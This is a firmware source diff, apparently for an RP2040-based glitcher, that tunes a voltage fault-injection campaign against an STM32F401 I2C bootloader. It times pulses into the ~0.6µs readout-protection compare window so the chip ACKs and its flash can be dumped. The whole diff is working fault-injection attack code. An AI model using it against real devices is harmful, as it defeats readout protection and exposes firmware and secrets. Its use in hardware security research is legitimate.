@@ -3638,6 +3638,11 @@ void target_power_i2cgate(uint32_t attempts, uint32_t vmin_mv) {
 
     uint32_t ack_wins = 0, nack = 0, nack_nodip = 0, addr_fail = 0, reads_ok = 0, reads_bad = 0;
     uint32_t reentries = 0;
+    // warm-up: the FIRST command frame after a fresh entry+GET always NACKs
+    // (cold slave) — fire an ungated 0x02 raw frame to settle it, else a
+    // fresh-per-shot campaign dies on attempt 1 every time.
+    i2c_bl_send_cmd_raw(a, 0x02);
+    sleep_ms(5);
     for (uint32_t i = 0; i < attempts; i++) {
         // dip state per attempt
         i2cgate_dwell_us = 0;
@@ -3873,21 +3878,37 @@ void target_power_i2cprobe(uint32_t samples, uint32_t delay_us) {
 // corruption to land on the cmp/`it ne; movne` verdict pair (~ns window).
 // User direction: corrupt the compare/control-flow, not the read value.
 //
-// This campaign fires a PIO pulse (6.67ns resolution) at swept offsets after
-// the 0x11 command frame's STOP edge, sweeping across the whole stretch
-// (measured legit stretch: 17-34ms; but the verdict is expected within the
-// first ~100us after STOP). Pulse width also swept. At RDP1: ACK + readable
-// flash = GATE BYPASSED (dump follows). NACKs are the normal gated response
-// and carry no signal except bus-liveness.
+// ROM analysis (tmp/f401_rom_disasm.txt): the whole rdp_locked() check runs
+// ~0.6us after the cmd byte's I2C ACK (dispatch + wrapper + 12-cycle check @
+// 48MHz) — the cmp/`it ne; movne` verdict window is only ~600ns wide, and at
+// RDP1 a corrupted OPTCR read value can only produce NACK. A false-pass needs
+// the pulse to hit the compare/control-flow itself. The verdict anchors to the
+// ACK-slot SCL rise of the cmd byte (post-byte hooks run ~400us too late, after
+// the trailing dly()s), so the pulse fires from INSIDE the ACK slot via
+// i2c_bl_send_cmd_ackhook and the PIO pause sweeps 0.6us+slack with 6.67ns
+// resolution. At RDP1: ACK + readable flash = GATE BYPASSED.
+// NACKs are the normal gated response and carry no signal except bus-liveness.
 // ============================================================================
+static bool i2cpulse_fired_this_shot = false;
+
+static uint16_t i2cpulse_vmin_raw = 4095;  // deepest ADC sample seen per shot
+static void i2cpulse_ackhook(void) {       // fired inside the cmd byte's ACK slot,
+    i2cpulse_fired_this_shot = true;       // before the ACK SCL rise (see
+    i2cpulse_fire();                       // i2c_wr_ack_hook)
+    // depth probe: continuous ADC poll for 50us after the fire — the single
+    // post-fire sample read recovery, not the dip (all geometries read
+    // ~2.87V regardless). Track the true minimum over the whole dip.
+    adc_power_init();
+    adc_select_input(ADC_POWER_CHAN);
+    uint64_t t0 = time_us_64();
+    while ((time_us_64() - t0) < 50) {
+        uint16_t v = adc_read();
+        if (v < i2cpulse_vmin_raw) i2cpulse_vmin_raw = v;
+    }
+}
+
 void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_hi,
                            uint32_t pause_step, uint32_t width_cycles) {
-    extern bool i2cpulse_start(uint32_t width_cycles);
-    extern void i2cpulse_push_pause(uint32_t pause_cycles);
-    extern void i2cpulse_fire(void);
-    extern void i2cpulse_stop(void);
-    extern bool i2c_bl_send_cmd_raw(uint8_t a, uint8_t cmd);
-
     if (power_group_glitch_blocked()) return;
     if (attempts == 0) attempts = 1;
     if (attempts > 2000) attempts = 2000;
@@ -3912,6 +3933,17 @@ void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_
         i2cpulse_stop();
         return;
     }
+    // warm-up: the FIRST command frame after a fresh entry+GET always NACKs
+    // (cold slave) — fire an ungated 0x02 raw frame to settle it (same as
+    // I2CGATE), else shot 1 bus-deads and cascades a re-entry every campaign
+    i2c_bl_send_cmd_raw(a, 0x02);
+    sleep_ms(5);
+
+    // NOW claim the pulse geometry. Must be AFTER the entry sequence:
+    // power_drive() re-drives all three gang pins as SIO outputs, undoing the
+    // release done in i2cpulse_start — the pulse would sink GP10 against two
+    // live 12mA sources (bench-proven sag floor ~2.87V, useless).
+    i2cpulse_reattach();
 
     uint32_t ack_wins = 0, nack = 0, addr_fail = 0, reads_ok = 0, reads_bad = 0;
     uint32_t reentries = 0;
@@ -3921,10 +3953,14 @@ void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_
 
         i2cpulse_push_pause(pause);
 
-        // send 0x11 cmd frame (raw, no verdict wait), fire the pulse at the
-        // STOP edge, then poll the verdict
-        bool addr_ok = i2c_bl_send_cmd_raw(a, 0x11);
-        if (addr_ok) i2cpulse_fire();   // fire at STOP edge (t0 reference)
+        // send the 0x11 cmd frame firing the pulse from INSIDE the cmd byte's
+        // ACK slot (before the ACK SCL rise) — the hook is the anchor; the
+        // PIO pause then sweeps the pulse across the ~0.6us dispatch +
+        // rdp_locked() + verdict window (plus slack for frame-geometry
+        // uncertainty). Then poll the verdict.
+        i2cpulse_fired_this_shot = false;
+        i2cpulse_vmin_raw = 4095;
+        bool addr_ok = i2c_bl_send_cmd_ackhook(a, 0x11, i2cpulse_ackhook);
 
         bool verdict = false;
         bool bus_alive = false;
@@ -3935,7 +3971,18 @@ void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_
         if (!addr_ok || !bus_alive) {
             addr_fail++;
             reentries++;
+            uart_cli_printf("  [%lu] pause %lus: bus-dead/no-addr (disturbance?)\r\n",
+                            (unsigned long)i + 1, (unsigned long)pause);
+            // RE-GANG before i2c_bl_enter: its power-cycle drives POWER_MASK
+            // via gpio_set_mask, which does nothing on input-released pins —
+            // released pins during re-entry left the target unpowered and
+            // every shot after the first bus-deaded (the 100/100 cascade).
+            gpio_set_dir(11, GPIO_OUT); gpio_put(11, 1);
+            gpio_set_dir(12, GPIO_OUT); gpio_put(12, 1);
             i2c_bl_enter(); sleep_ms(60);
+            // hand all three gang pins back to the PIO sink (i2cpulse_start
+            // geometry — i2c_bl_enter's power-cycle re-ganged them to SIO)
+            i2cpulse_reattach();
             continue;
         }
 
@@ -3958,6 +4005,10 @@ void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_
             }
         } else {
             nack++;   // at RDP1 this is the normal gated response — no signal
+            if ((i % 100) == 99)
+                uart_cli_printf("  [%lu] pause %lus: NACK, rail min %.2fV\r\n",
+                                (unsigned long)i + 1, (unsigned long)pause,
+                                i2cpulse_vmin_raw * 3.3f / 4095.0f);
         }
     }
 
